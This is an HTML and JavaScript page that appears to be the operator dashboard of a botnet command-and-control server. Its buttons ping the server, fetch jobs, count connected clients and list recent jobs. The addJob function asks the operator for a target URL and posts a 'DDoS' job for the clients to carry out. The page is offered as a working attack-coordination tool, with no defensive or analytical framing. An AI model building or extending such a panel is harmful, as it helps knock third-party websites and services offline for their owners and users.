<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        h1 {
            text-align: center;
        }

        button {
            padding: 10px;
            margin: 10px;
            cursor: pointer;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            margin-bottom: 5px;
        }

        .recent-section {
            margin-top: 20px;
        }
    </style>
</head>
<body>

<h1>Dashboard</h1>

<button onclick="getVersion()">Get Version</button>
<p id="version"></p>

<button onclick="pingServer()">Ping Server</button>
<p id="pingStatus"></p>

<button onclick="getJob()">Get Job</button>
<p id="jobStatus"></p>

<button onclick="addJob()">Add Job</button>
<p id="addJobStatus"></p>

<button onclick="getClientsCount()">Get Clients Count</button>
<p id="clientsCount"></p>

<div class="recent-section">
    <h2>Recent Jobs</h2>
    <ul id="recentJobs"></ul>
</div>

<div class="recent-section">
    <h2>Recent Pingers</h2>
    <ul id="recentPingers"></ul>
</div>

<script>
    function getVersion() {
        fetch("/get_version/")
            .then(response => response.json())
            .then(data => {
                document.getElementById("version").innerText = "Version: " + data.version;
            });
    }

    function pingServer() {
        fetch("/ping/")
            .then(response => response.json())
            .then(data => {
                document.getElementById("pingStatus").innerText = "Ping Status: " + data.status;
                if (data.prioritize) {
                    alert("Priority task available!");
                }
            });
    }

    function getJob() {
        fetch("/get_job/")
            .then(response => response.json())
            .then(data => {
                document.getElementById("jobStatus").innerText = "Job Status: " + data.status;
                if (data.status === "ok") {
                    alert("Job received: " + JSON.stringify(data));
                    updateRecentJobs(data); // Update the recent jobs list
                }
            });
    }

    function addJob() {
        var targetUrl = prompt("Enter target URL for DDoS job:");
        if (targetUrl) {
            fetch("/add_job/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ job_type: "DDoS", target_url: targetUrl })
            })
                .then(response => response.json())
                .then(data => {
                    document.getElementById("addJobStatus").innerText = "Add Job Status: " + data.status;
                });
        }
    }

    function getClientsCount() {
        fetch("/get_clients_count/")
            .then(response => response.json())
            .then(data => {
                document.getElementById("clientsCount").innerText = "Clients Count: " + data.clients_count;
            });
    }

    function updateRecentJobs(job) {
        const recentJobsList = document.getElementById("recentJobs");
        const listItem = document.createElement("li");
        listItem.textContent = `Job: ${JSON.stringify(job)}`;
        recentJobsList.appendChild(listItem);

        // Limit the number of items to, for example, the last 5
        if (recentJobsList.children.length > 5) {
            recentJobsList.removeChild(recentJobsList.firstChild);
        }
    }

    function getJobsList() {
        fetch("/get_jobs_list/")
            .then(response => response.json())
            .then(data => {
                const jobsList = document.getElementById("jobsList");
                jobsList.innerHTML = "Jobs List:";
                data.jobs.forEach(job => {
                    const listItem = document.createElement("li");
                    listItem.textContent = JSON.stringify(job);
                    jobsList.appendChild(listItem);
                });
            });
    }

    setInterval(getClientsCount, 5000); // Update every 5 seconds (adjust as needed)

</script>

</body>
</html>
